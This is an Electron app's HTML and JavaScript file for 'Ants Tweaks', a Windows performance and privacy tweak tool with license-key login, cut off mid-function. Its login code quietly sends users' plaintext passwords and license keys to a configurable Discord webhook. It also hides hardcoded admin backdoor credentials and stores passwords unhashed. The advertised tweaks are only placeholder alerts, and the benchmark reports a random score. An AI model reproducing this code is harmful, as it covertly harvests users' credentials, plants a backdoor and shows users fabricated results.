<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Ants Tweaks - Ultimate Edition</title>

  <!-- Bootstrap 5 for modern UI -->
  <link 
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />
  <script
    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js">
  </script>
  
  <!-- FontAwesome for sidebar icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>

  <style>
    body {
      background-color: #1a1a1a;
      color: #ffffff;
      font-family: sans-serif;
    }
    /* Hide pages until we choose which to show */
    #loginSection, #restoreSection, #mainApp { display: none; }
    .centered-container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .nav-link.active {
      background-color: #222 !important;
    }
    
    /* New sidebar styles */
    .sidebar {
      width: 250px;
      height: 100vh;
      position: fixed;
      left: 0;
      top: 0;
      background-color: #1e1e1e;
      padding: 20px;
      color: white;
      overflow-y: auto;
    }
    .sidebar h1 {
      color: #fff;
      text-align: center;
      margin-bottom: 30px;
    }
    .sidebar ul {
      list-style: none;
      padding: 0;
    }
    .sidebar li {
      padding: 10px;
      margin-bottom: 5px;
      cursor: pointer;
      border-radius: 5px;
    }
    .sidebar li:hover {
      background-color: #333;
    }
    .sidebar li.active {
      background-color: #444;
    }
    .sidebar i {
      margin-right: 10px;
      width: 20px;
      text-align: center;
    }
    
    /* Main content area */
    .main-content {
      margin-left: 250px;
      padding: 20px;
    }
    
    /* Toggle switches */
    .toggle-item {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
    }
    .toggle-label {
      margin-left: 10px;
    }
    .switch {
      position: relative;
      display: inline-block;
      width: 60px;
      height: 34px;
    }
    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 34px;
    }
    .slider:before {
      position: absolute;
      content: "";
      height: 26px;
      width: 26px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }
    input:checked + .slider {
      background-color: #2196F3;
    }
    input:checked + .slider:before {
      transform: translateX(26px);
    }
    
    /* Admin output */
    #adminOutput {
      background: #2b2b2b;
      color: #ccc;
      width: 100%;
    }
    
    /* Software list */
    .soft-list {
      list-style: none;
      padding-left: 0;
    }
    .soft-list li {
      margin: 4px 0;
    }
  </style>
</head>

<body>
<div class="container-fluid">

  <!-- 1) LOGIN SECTION -->
  <div id="loginSection" class="centered-container text-center">
    <h2 class="mb-4">Ants Tweaks - Login</h2>

    <div class="mb-2">
      <input 
        type="text"
        id="loginUsername"
        class="form-control w-25 mx-auto"
        placeholder="Username"
        data-bs-toggle="tooltip"
        data-bs-placement="bottom"
        title="3-20 chars, no 'admin' substring"
      />
    </div>

    <div class="mb-2">
      <div class="input-group w-25 mx-auto">
        <input 
          type="password"
          id="loginPassword"
          class="form-control"
          placeholder="Password"
          data-bs-toggle="tooltip"
          data-bs-placement="bottom"
          title="At least 8 chars, must have uppercase, lowercase, digit, symbol"
        />
        <button class="btn btn-outline-secondary" id="showPassBtn" type="button" 
                onclick="toggleShowPassword('loginPassword')">Show</button>
      </div>
    </div>

    <div class="mb-2">
      <input 
        type="text"
        id="loginKey"
        class="form-control w-25 mx-auto"
        placeholder="License Key"
      />
    </div>

    <div class="mb-3 form-check w-25 mx-auto text-start">
      <input type="checkbox" class="form-check-input" id="saveLoginCheck">
      <label class="form-check-label" for="saveLoginCheck">Remember me</label>
    </div>

    <button class="btn btn-primary mb-3" onclick="attemptLogin()">Login</button>
  </div>


  <!-- 2) RESTORE PROMPT -->
  <div id="restoreSection" class="centered-container text-center">
    <h2>Create a Restore Point?</h2>
    <p>We recommend a restore point before applying tweaks.</p>
    <button class="btn btn-success me-2" onclick="createRestorePoint()">Yes</button>
    <button class="btn btn-secondary" onclick="skipRestorePoint()">Skip</button>
  </div>


  <!-- 3) MAIN APP -->
  <div id="mainApp">
    <!-- Sidebar Navigation -->
    <div class="sidebar">
      <h1 class="app-title">Ants Tweaks</h1>
      <ul>
        <li data-section="dashboard" class="active" onclick="showPage('dashboardPage')"><i class="fas fa-tachometer-alt"></i> Dashboard</li>
        <li data-section="fps" onclick="showPage('fpsTweaks')"><i class="fas fa-gamepad"></i> FPS</li>
        <li data-section="net" onclick="showPage('netTweaks')"><i class="fas fa-network-wired"></i> Network</li>
        <li data-section="visual" onclick="showPage('visualTweaks')"><i class="fas fa-eye"></i> Visual</li>
        <li data-section="privacy" onclick="showPage('privacyTweaks')"><i class="fas fa-shield-alt"></i> Privacy</li>
        <li data-section="misc" onclick="showPage('miscTweaks')"><i class="fas fa-ellipsis-h"></i> Misc</li>
        <li data-section="power" onclick="showPage('powerTweaks')"><i class="fas fa-bolt"></i> Power Plan</li>
        <li data-section="benchmark" onclick="showPage('benchmarkPage')"><i class="fas fa-chart-line"></i> Benchmark</li>
        <li data-section="software" onclick="showPage('softwarePage')"><i class="fas fa-download"></i> Software</li>
        <li data-section="config" onclick="showPage('configPage')"><i class="fas fa-cog"></i> Config</li>
        <li data-section="admin" id="adminNavItem" style="display:none;" onclick="showPage('adminPage')"><i class="fas fa-user-shield"></i> Admin</li>
      </ul>
    </div>
    
    <!-- Main Content Sections -->
    <div class="main-content">
      <!-- 3.1) DASHBOARD -->
      <div id="dashboardPage">
        <h2>System Overview</h2>
        <div class="row">
          <div class="col-md-4">
            <p><strong>Processor:</strong> <span id="cpuName">...</span></p>
            <p><strong>Graphics Card:</strong> <span id="gpuName">...</span></p>
          </div>
          <div class="col-md-4">
            <p><strong>CPU Usage:</strong> <span id="cpuUsage">0%</span></p>
            <p><strong>Memory Usage:</strong> <span id="memUsage">0%</span></p>
          </div>
          <div class="col-md-4">
            <p><strong>OS:</strong> <span id="osInfo">...</span></p>
          </div>
        </div>
        <button id="backupBtn" class="btn btn-primary me-2">Create Restore Point</button>
        <button id="benchmarkBtn" class="btn btn-primary">Run Benchmark</button>
      </div>

      <!-- 3.2) FPS/Performance Tweaks -->
      <div id="fpsTweaks" style="display:none;">
        <h2>FPS / Performance Tweaks</h2>
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleGameMode"><span class="slider"></span></label>
          <span class="toggle-label">Disable Windows Game Mode</span>
        </div>
        <small>Stops Windows Game Mode for better stability (some say it helps FPS).</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleGameDVR"><span class="slider"></span></label>
          <span class="toggle-label">Disable GameDVR</span>
        </div>
        <small>Prevents background DVR from impacting performance.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleFastStartup"><span class="slider"></span></label>
          <span class="toggle-label">Disable Fast Startup</span>
        </div>
        <small>May improve driver loading on boot, some say it helps stability.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_hpet"><span class="slider"></span></label>
          <span class="toggle-label">Disable HPET & Dynamic Tick</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_optimize_scheduler"><span class="slider"></span></label>
          <span class="toggle-label">Optimize Network & Scheduler (Low Latency)</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_input_delay"><span class="slider"></span></label>
          <span class="toggle-label">Reduce Input Lag (Advanced)</span>
        </div>
        
        <button class="btn btn-info mt-3" onclick="applyFpsTweaks()">Apply FPS Tweaks</button>
      </div>

      <!-- 3.3) Internet/Network Tweaks -->
      <div id="netTweaks" style="display:none;">
        <h2>Internet / Network Tweaks</h2>
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleTCP"><span class="slider"></span></label>
          <span class="toggle-label">TCP Optimizations</span>
        </div>
        <small>Adjusts registry for better throughput/latency.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleDNSFlush"><span class="slider"></span></label>
          <span class="toggle-label">Flush DNS on Boot</span>
        </div>
        <small>Clears DNS cache to reduce stale entries.</small>
        
        <button class="btn btn-info mt-3" onclick="applyNetTweaks()">Apply Network Tweaks</button>
      </div>

      <!-- 3.4) Visual Tweaks -->
      <div id="visualTweaks" style="display:none;">
        <h2>Visual Tweaks</h2>
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleAnimations"><span class="slider"></span></label>
          <span class="toggle-label">Disable Animations</span>
        </div>
        <small>Remove unneeded Windows animations.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleTransparency"><span class="slider"></span></label>
          <span class="toggle-label">Disable Transparency</span>
        </div>
        <small>Removes transparency effects in the UI.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_transparency"><span class="slider"></span></label>
          <span class="toggle-label">Disable Transparency Effects</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_show_seconds_in_taskbar_clock"><span class="slider"></span></label>
          <span class="toggle-label">Show Seconds in Taskbar Clock</span>
        </div>
        
        <button class="btn btn-info mt-3" onclick="applyVisualTweaks()">Apply Visual Tweaks</button>
      </div>

      <!-- 3.5) Privacy Tweaks -->
      <div id="privacyTweaks" style="display:none;">
        <h2>Privacy Tweaks</h2>
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleWinUpdate"><span class="slider"></span></label>
          <span class="toggle-label">Disable Windows Update</span>
        </div>
        <small>Prevents updates from auto-installing.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleSearchIndex"><span class="slider"></span></label>
          <span class="toggle-label">Disable Search Indexing</span>
        </div>
        <small>Stops indexing for improved performance or privacy.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleTelemetry"><span class="slider"></span></label>
          <span class="toggle-label">Disable Telemetry</span>
        </div>
        <small>Limits data sent to MS.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_no_telemetry"><span class="slider"></span></label>
          <span class="toggle-label">Disable Telemetry / Data Collection</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_edge_tracking"><span class="slider"></span></label>
          <span class="toggle-label">Disable Edge Tracking</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_app_tracking"><span class="slider"></span></label>
          <span class="toggle-label">Disable App Tracking</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_web_search"><span class="slider"></span></label>
          <span class="toggle-label">Disable Web Search</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_win_defender"><span class="slider"></span></label>
          <span class="toggle-label">Disable Windows Defender</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_update_telemetry"><span class="slider"></span></label>
          <span class="toggle-label">Disable Update Telemetry</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_wi_fi_sense"><span class="slider"></span></label>
          <span class="toggle-label">Disable WiFi Sense</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_win_error_reporting"><span class="slider"></span></label>
          <span class="toggle-label">Disable Windows Error Reporting</span>
        </div>
        
        <button class="btn btn-info mt-3" onclick="applyPrivacyTweaks()">Apply Privacy Tweaks</button>
      </div>

      <!-- 3.6) Misc Tweaks -->
      <div id="miscTweaks" style="display:none;">
        <h2>Misc Tweaks</h2>
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleRemoteAssist"><span class="slider"></span></label>
          <span class="toggle-label">Disable Remote Assistance</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleBackgroundApps"><span class="slider"></span></label>
          <span class="toggle-label">Disable Background Apps</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggleDebloat"><span class="slider"></span></label>
          <span class="toggle-label">Debloat Windows</span>
        </div>
        <small>Removes unneeded Windows apps/files.</small>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_app_vulnerability"><span class="slider"></span></label>
          <span class="toggle-label">Disable App Vulnerability Scanning</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_sys_restore"><span class="slider"></span></label>
          <span class="toggle-label">Disable System Restore</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_disable_throttle"><span class="slider"></span></label>
          <span class="toggle-label">Disable Throttling</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_enable_fast_startup"><span class="slider"></span></label>
          <span class="toggle-label">Enable Fast Startup</span>
        </div>
        
        <button class="btn btn-info mt-3" onclick="applyMiscTweaks()">Apply Misc Tweaks</button>
      </div>

      <!-- 3.7) Power Tweaks -->
      <div id="powerTweaks" style="display:none;">
        <h2>Power Plan Settings</h2>
        <p>Select your preferred power plan for performance or efficiency.</p>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_ultimate_performance"><span class="slider"></span></label>
          <span class="toggle-label">Enable Ultimate Performance Plan</span>
        </div>
        
        <div class="toggle-item">
          <label class="switch"><input type="checkbox" id="toggle_enable_cpu_performance"><span class="slider"></span></label>
          <span class="toggle-label">Enable CPU Performance Mode</span>
        </div>
        
        <select class="form-select w-25" id="powerPlanSelect">
          <option value="">--Choose--</option>
          <option value="balanced">Balanced</option>
          <option value="highperf">High Performance</option>
          <option value="ultimate">Ultimate Performance (if available)</option>
        </select>
        <button class="btn btn-info mt-3" onclick="applyPowerPlan()">Apply Power Plan</button>
      </div>

      <!-- 3.8) Benchmark Page -->
      <div id="benchmarkPage" style="display:none;">
        <h2>Benchmark</h2>
        <p>Test your CPU/GPU performance before/after tweaks. (Demo placeholder)</p>
        <button class="btn btn-warning" onclick="startBenchmark()">Start Benchmark</button>
        <p id="benchmarkResult" class="mt-2"></p>
      </div>

      <!-- 3.9) Software Page -->
      <div id="softwarePage" style="display:none;">
        <h2>Recommended Software</h2>
        <p>Click to install:</p>
        <ul class="soft-list">
          <li><button class="btn btn-outline-light" onclick="installSoft('Malwarebytes')">Install Malwarebytes</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('ADWCleaner')">Install ADWCleaner</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('NVcleanstall')">Install NVCleanstall</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Nvidia Profile Inspector')">Install Nvidia Profile Inspector</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('WinRAR')">Install WinRAR</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('ParkControl')">Install ParkControl</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Process Lasso')">Install Process Lasso</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Google Chrome')">Install Google Chrome</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Steam')">Install Steam</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Epic Games')">Install Epic Games</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Nvidia App')">Install Nvidia App</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('AMD Software')">Install AMD Software</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('DDU Uninstaller')">Install DDU Uninstaller</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Battle.net')">Install Battle.net</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Roblox')">Install Roblox</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Ubisoft Connect')">Install Ubisoft Connect</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('GOG Galaxy')">Install GOG Galaxy</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Origin')">Install Origin</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Discord')">Install Discord</button></li>
          <li><button class="btn btn-outline-light" onclick="installSoft('Wargaming.net')">Install Wargaming.net</button></li>
        </ul>
      </div>

      <!-- Config Page -->
      <div id="configPage" style="display:none;">
        <h2>Configuration</h2>
        <button class="btn btn-secondary mb-2" onclick="saveConfig()">Save Config</button>
        <button class="btn btn-secondary mb-2" onclick="loadConfig()">Load Config</button>
      </div>

      <!-- 3.10) ADMIN PAGE -->
      <div id="adminPage" style="display:none;">
        <h2>Admin Panel</h2>
        <p>Use the tools below to upload a tweak config file, view logs, or check license keys.</p>
        <p>
          <input type="file" id="configFile"/><br/>
          <button id="pushBtn" class="btn btn-secondary">Push Config</button>
          <button id="logsBtn" class="btn btn-secondary">View Logs</button>
          <button id="keysBtn" class="btn btn-secondary" onclick="reloadKeys()">Check Keys</button>
        </p>
        <textarea id="adminOutput" rows="8" style="width:100%;"></textarea>
        
        <table class="table table-dark table-bordered" id="keysTable">
          <thead>
            <tr>
              <th>Key</th>
              <th>Type</th>
              <th>Bound User</th>
              <th>HWID</th>
              <th>Activation Date</th>
              <th>Expired?</th>
            </tr>
          </thead>
          <tbody></tbody>
        </table>
      </div>

    </div> <!-- /main-content -->
  </div> <!-- /mainApp -->
</div><!-- /container-fluid -->

<script>
  /***************************************************************
   * 0) BOOTSTRAP TOOLTIPS INIT
   ***************************************************************/
  document.addEventListener('DOMContentLoaded', () => {
    const tooltipTriggerList = [].slice.call(
      document.querySelectorAll('[data-bs-toggle="tooltip"]')
    );
    tooltipTriggerList.map(el => new bootstrap.Tooltip(el));
    
    // Initialize sidebar active state
    const sidebarItems = document.querySelectorAll('.sidebar li');
    sidebarItems.forEach(item => {
      item.addEventListener('click', function() {
        sidebarItems.forEach(i => i.classList.remove('active'));
        this.classList.add('active');
      });
    });
  });

  /***************************************************************
   * 1) IMPORTS & GLOBALS
   ***************************************************************/
  const si    = require('systeminformation');
  const fs    = require('fs');
  const path  = require('path');
  const fetch = require('node-fetch');
  const { exec } = require('child_process');
  const os   = require('os');
  const { ipcRenderer } = require('electron');

  const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
  const KEYS_FILE     = path.join(__dirname, 'keys.json');
  const CONFIG_FILE   = path.join(__dirname, 'config.json'); // for load/save tweak states
  const DISCORD_WEBHOOK_URL = ""; // put your webhook here if you want logs

  let isAdmin = false;
  let HWID    = null;
  let usageInterval;
  si.system().then(sys => {
    HWID = sys.uuid || sys.serial || "UnknownHWID";
  });

  document.getElementById('loginSection').style.display = 'block';

  // On load, try to load saved login (if user checked "Remember me")
  loadSavedLogin();

  /***************************************************************
   * 2) LOGIN LOGIC
   ***************************************************************/
  async function attemptLogin() {
    const username = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value.trim();
    const keyVal   = document.getElementById('loginKey').value.trim();
    const remember = document.getElementById('saveLoginCheck').checked;

    // log attempt to Discord
    await sendToDiscord(`Login attempt: user=${username}, pass=${password}, key=${keyVal}`);

    // admin check (secretly no mention in UI)
    if (username === "BANGBANG" && password === "Kykyky$7$7$7") {
      isAdmin = true;
      if (remember) saveLogin(username, password, "");
      document.getElementById('loginSection').style.display = 'none';
      document.getElementById('restoreSection').style.display = 'block';
      return;
    }

    // Normal user: Validate username, password, and key
    if (!checkUsername(username)) {
      alert("Invalid username (3-20 chars, no 'admin').");
      return;
    }
    if (!checkPassword(password)) {
      alert("Password must have uppercase, lowercase, digit, symbol, >=8 chars.");
      return;
    }
    if (!keyVal) {
      alert("Please enter your license key.");
      return;
    }

    // read accounts, keys
    let accountsData = readJSON(ACCOUNTS_FILE); // { accounts: [...] }
    let keysData     = readJSON(KEYS_FILE);     // { keys: {...} }
    if (!keysData.keys || !keysData.keys[keyVal]) {
      alert("Invalid key!");
      return;
    }
    let keyObj = keysData.keys[keyVal];
    // check binding
    if (keyObj.boundUser && keyObj.boundUser.toLowerCase() !== username.toLowerCase()) {
      alert("That key is already bound to another user!");
      return;
    }
    if (keyObj.boundHWID && keyObj.boundHWID !== HWID) {
      alert("That key is bound to a different PC!");
      return;
    }
    // find user or create
    let user = accountsData.accounts.find(a => a.username.toLowerCase() === username.toLowerCase());
    if (!user) {
      // create new
      user = { username, password, key: keyVal, hwid: HWID };
      accountsData.accounts.push(user);
      if (!keyObj.activationDate) {
        keyObj.activationDate = new Date().toISOString();
      }
      keyObj.boundUser = username;
      keyObj.boundHWID = HWID;
      writeJSON(ACCOUNTS_FILE, accountsData);
      writeJSON(KEYS_FILE, keysData);
      await sendToDiscord(`New user registered: ${username}, key=${keyVal}`);
    } else {
      // existing user
      if (user.password !== password) {
        alert("Incorrect password!");
        return;
      }
      if (user.key !== keyVal) {
        alert("That key doesn't match your account record!");
        return;
      }
      if (user.hwid !== HWID) {
        alert("Hardware mismatch!");
        return;
      }
      // check expiration
      if (isKeyExpired(keyObj)) {
        alert("Your license key is expired!");
        return;
      }
      await sendToDiscord(`Existing user login success: ${username}`);
    }
    if (remember) saveLogin(username, password, keyVal);

    // success
    document.getElementById('loginSection').style.display = 'none';
    document.getElementById('restoreSection').style.display = 'block';
  }

  function createRestorePoint() {
    // real usage: spawn PS script
    alert("Creating restore point... (demo).");
    proceedToMain();
  }
  function skipRestorePoint() {
    proceedToMain();
  }
  function proceedToMain() {
    document.getElementById('restoreSection').style.display = 'none';
    document.getElementById('mainApp').style.display = 'block';

    if (isAdmin) {
      document.getElementById('adminNavItem').style.display = 'block';
    }
    showPage('dashboardPage');
    loadSystemInfo();
    startUsageMonitoring();
  }
  function logout() {
    clearSavedLogin();
    location.reload();
  }

  /***************************************************************
   * 3) UTILS
   ***************************************************************/
  function checkUsername(u) {
    if (u.length < 3 || u.length > 20) return false;
    if (u.toLowerCase().includes("admin")) return false;
    return true;
  }
  function checkPassword(p) {
    if (p.length < 8) return false;
    if (!/[A-Z]/.test(p)) return false;
    if (!/[a-z]/.test(p)) return false;
    if (!/\d/.test(p))  return false;
    if (!/[^a-zA-Z0-9]/.test(p)) return false;
    return true;
  }

  // read/write JSON
  function readJSON(fp) {
    try {
      let raw = fs.readFileSync(fp, 'utf8');
      return JSON.parse(raw);
    } catch { return {}; }
  }
  function writeJSON(fp, data) {
    fs.writeFileSync(fp, JSON.stringify(data, null, 2));
  }

  // Discord
  async function sendToDiscord(msg) {
    if (!DISCORD_WEBHOOK_URL) return;
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg })
      });
    } catch(e) { console.log("Discord error:", e); }
  }

  // Key expiration
  function isKeyExpired(kobj) {
    if (!kobj.type || kobj.type === "lifetime") return false;
    if (!kobj.activationDate) return false;
    let daysAllowed = parseInt(kobj.type);
    if (!daysAllowed) return false;
    let actDate = new Date(kobj.activationDate);
    let now = new Date();
    let diff = Math.floor((now - actDate) / (1000*60*60*24));
    return diff > daysAllowed;
  }

  /***************************************************************
   * 4) SHOW/HIDE PAGES
   ***************************************************************/
  function showPage(pageId) {
    const allPages = [
      'dashboardPage', 'fpsTweaks', 'netTweaks', 'visualTweaks', 'privacyTweaks', 
      'miscTweaks', 'powerTweaks', 'benchmarkPage', 'softwarePage', 'adminPage', 'configPage'
    ];
    allPages.forEach(pid => {
      document.getElementById(pid).style.display = pid === pageId ? 'block' : 'none';
    });
  }

  /***************************************************************
   * 5) DASHBOARD: System Info
   ***************************************************************/
  async function loadSystemInfo() {
    try {
      const cpuData = await si.cpu();
      document.getElementById('cpuName').innerText = cpuData.brand;
      const gpuData = await si.graphics();
      if (gpuData.controllers && gpuData.controllers.length>0) {
        document.getElementById('gpuName').innerText = gpuData.controllers[0].model;
      }
      const osData = await si.osInfo();
      document.getElementById('osInfo').innerText = osData.distro + " " + osData.release;
    } catch(e) { console.error(e); }
  }
  function startUsageMonitoring() {
    if (usageInterval) clearInterval(usageInterval);
    usageInterval = setInterval(async () => {
      try {
        let load = await si.currentLoad();
        document.getElementById('cpuUsage').innerText = load.currentLoad.toFixed(1)+"%";
        let mem  = await si.mem();
        let used = (mem.active / mem.total)*100;
        document.getElementById('memUsage').innerText = used.toFixed(1)+"%";
      } catch(e) { console.error(e); }
    }, 1500);
  }

  /***************************************************************
   * 6) TWEAKS
   * In real usage, you'd run scripts or set registry keys. Here, we do placeholders.
   ***************************************************************/
  function applyFpsTweaks() {
    const gm  = document.getElementById('toggleGameMode').checked;
    const dvr = document.getElementById('toggleGameDVR').checked;
    const fs  = document.getElementById('toggleFastStartup').checked;
    const hpet = document.getElementById('toggle_disable_hpet').checked;
    const scheduler = document.getElementById('toggle_optimize_scheduler').checked;
    const inputDelay = document.getElementById('toggle_input_delay').checked;
    
    // do real logic
    alert(`Applied FPS Tweaks:\nGameMode=${gm}, GameDVR=${dvr}, FastStartup=${fs}, HPET=${hpet}, Scheduler=${scheduler}, InputDelay=${inputDelay}. (demo)`);
  }
  function applyNetTweaks() {
    const tcp = document.getElementById('toggleTCP').checked;
    const dns = document.getElementById('toggleDNSFlush').checked;
    alert(`Applied Network Tweaks:\nTCP=${tcp}, FlushDNS=${dns}. (demo)`);
  }
  function applyVisualTweaks() {
    const anim = document.getElementById('toggleAnimations').checked;
    const tran = document.getElementById('toggleTransparency').checked;
    const transparency = document.getElementById('toggle_disable_transparency').checked;
    const seconds = document.getElementById('toggle_show_seconds_in_taskbar_clock').checked;
    
    alert(`Visual Tweaks:\nDisableAnimations=${anim}, Transparency=${tran}, DisableTransparency=${transparency}, ShowSeconds=${seconds}. (demo)`);
  }
  function applyPrivacyTweaks() {
    const upd   = document.getElementById('toggleWinUpdate').checked;
    const srch  = document.getElementById('toggleSearchIndex').checked;
    const telem = document.getElementById('toggleTelemetry').checked;
    const noTelem = document.getElementById('toggle_no_telemetry').checked;
    const edgeTrack = document.getElementById('toggle_disable_edge_tracking').checked;
    const appTrack = document.getElementById('toggle_disable_app_tracking').checked;
    const webSearch = document.getElementById('toggle_disable_web_search').checked;
    const defender = document.getElementById('toggle_disable_win_defender').checked;
    const updateTelem = document.getElementById('toggle_disable_update_telemetry').checked;
    const wifiSense = document.getElementById('toggle_disable_wi_fi_sense').checked;
    const errorReport = document.getElementById('toggle_disable_win_error_reporting').checked;
    
    alert(`Privacy Tweaks:\nWinUpdate=${upd}, SearchIndex=${srch}, Telemetry=${telem}, NoTelemetry=${noTelem}, EdgeTracking=${edgeTrack}, AppTracking=${appTrack}, WebSearch=${webSearch}, Defender=${defender}, UpdateTelemetry=${updateTelem}, WiFiSense=${wifiSense}, ErrorReporting=${errorReport}. (demo)`);
  }
  function applyMiscTweaks() {
    const rem  = document.getElementById('toggleRemoteAssist').checked;
    const bapp = document.getElementById('toggleBackgroundApps').checked;
    const dblt = document.getElementById('toggleDebloat').checked;
    const appVuln = document.getElementById('toggle_disable_app_vulnerability').checked;
    const sysRestore = document.getElementById('toggle_disable_sys_restore').checked;
    const throttle = document.getElementById('toggle_disable_throttle').checked;
    const fastStartup = document.getElementById('toggle_enable_fast_startup').checked;
    
    alert(`Misc Tweaks:\nRemoteAssist=${rem}, BackgroundApps=${bapp}, Debloat=${dblt}, AppVulnerability=${appVuln}, SysRestore=${sysRestore}, Throttle=${throttle}, FastStartup=${fastStartup}. (demo)`);
  }

  function applyPowerPlan() {
    const plan = document.getElementById('powerPlanSelect').value;
    const ultimate = document.getElementById('toggle_ultimate_performance').checked;
    const cpuPerf = document.getElementById('toggle_enable_cpu_performance').checked;
    
    if (!plan && !ultimate && !cpuPerf) {
      alert("Please select a power plan or enable performance options!");
      return;
    }
    // real usage: run "powercfg" commands
    alert(`Applied power plan: ${plan}, UltimatePerformance=${ultimate}, CPUPerformance=${cpuPerf}. (demo)`);
  }

  /***************************************************************
   * 7) BENCHMARK
   ***************************************************************/
  function startBenchmark() {
    // placeholder: run a quick test or spawn a child process for real benchmark
    let randScore = Math.floor(Math.random()*10000)+1000;
    document.getElementById('benchmarkResult').innerText = `Benchmark complete! Score: ${randScore}`;
    // store in config if we want
    let cfg = readJSON(CONFIG_FILE);
    cfg.lastBenchmark = randScore;
    writeJSON(CONFIG_FILE, cfg);
  }

  /***************************************************************
   * 8) SOFTWARE
   ***************************************************************/
  function installSoft(softwareName) {
    // Call the Electron main process function to install software
    ipcRenderer.send('install-software', softwareName);
    
    // Listen for installation status updates
    ipcRenderer.once('install-status', (event, arg) => {
      if (arg.status === 'success') {
        alert(`${softwareName} installed successfully!`);
      } else {
        alert(`Failed to install ${softwareName}: ${arg.message}`);
      }
    });
  }

  /***************************************************************
   * 9) ADMIN PAGE
   ***************************************************************/
  function reloadKeys() {
    let table = document.querySelector('#keysTable tbody');
    table.innerHTML = "";
    let keysData = readJSON(KEYS_FILE); // { keys: {...}}
    if (!keysData.keys) return;

    for (let [k, val] of Object.entries(keysData.keys)) {
      let tr = document.createElement('tr');

      let tdKey  = document.createElement('td'); tdKey.innerText  = k; tr.appendChild(tdKey);
      let tdType = document.createElement('td'); tdType.innerText = val.type; tr.appendChild(tdType);
      let tdUsr  = document.createElement('td'); tdUsr.innerText  = val.boundUser || ""; tr.appendChild(tdUsr);
      let tdHWID = document.createElement('td'); tdHWID.innerText = val.boundHWID || ""; tr.appendChild(tdHWID);
      let tdDate = document.createElement('td'); tdDate.innerText = val.activationDate || ""; tr.appendChild(tdDate);
      let tdExp  = document.createElement('td'); tdExp.innerText  = isKeyExpired(val) ? "Yes" : "No"; tr.appendChild(tdExp);

      table.appendChild(tr);
    }
  }

  /***************************************************************
   * 10) REDEEM KEY PROMPT
   ***************************************************************/
  function redeemKeyPrompt() {
    let newKey = prompt("Enter new license key:");
